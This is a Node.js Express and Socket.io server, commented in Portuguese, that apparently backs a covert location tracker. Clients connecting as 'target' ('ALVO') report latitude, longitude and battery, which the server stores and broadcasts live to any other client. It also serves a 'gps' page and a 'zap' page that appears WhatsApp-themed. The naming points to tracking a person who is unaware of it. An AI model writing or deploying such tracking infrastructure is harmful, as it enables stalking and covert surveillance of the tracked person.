const express = require('express');
const app = express();
const http = require('http').createServer(app);
const path = require('path'); // <--- A MÁGICA ESTÁ AQUI
const io = require('socket.io')(http, {
    cors: { origin: "*" }
});

// --- CORREÇÃO DE CAMINHOS PARA NUVEM ---
// Isso garante que o Render ache a pasta 'public' e 'views'
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// --- ROTAS ---
app.get('/', (req, res) => res.render('home'));
app.get('/gps', (req, res) => res.render('gps'));
app.get('/zap', (req, res) => res.render('zap'));

// --- MEMÓRIA DO SERVIDOR ---
let lastKnownData = null;

io.on('connection', (socket) => {
    const role = socket.handshake.query.role;

    if (role === 'target') {
        console.log(`[ALVO CONECTADO] ID: ${socket.id}`);
        
        socket.on('report_location', (data) => {
            // Guarda na memória
            lastKnownData = {
                deviceId: "ALVO_01",
                lat: data.lat,
                lng: data.lng,
                battery: data.battery,
                status: "ONLINE",
                timestamp: new Date().toLocaleTimeString()
            };
            
            // Manda para o site
            io.emit('gps_update', lastKnownData);
            console.log(`[GPS] Lat: ${data.lat} / Lng: ${data.lng}`);
        });

        socket.on('disconnect', () => {
             if(lastKnownData) lastKnownData.status = "OFFLINE";
             io.emit('target_status', { status: 'OFFLINE' });
        });

    } else {
        // Se o Site conectar e já tivermos dados, enviamos na hora!
        if (lastKnownData) {
            socket.emit('gps_update', lastKnownData);
        }
    }
});

// Porta automática do Render ou 3000 local
const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`[SISTEMA] Rodando na porta ${PORT}`);
});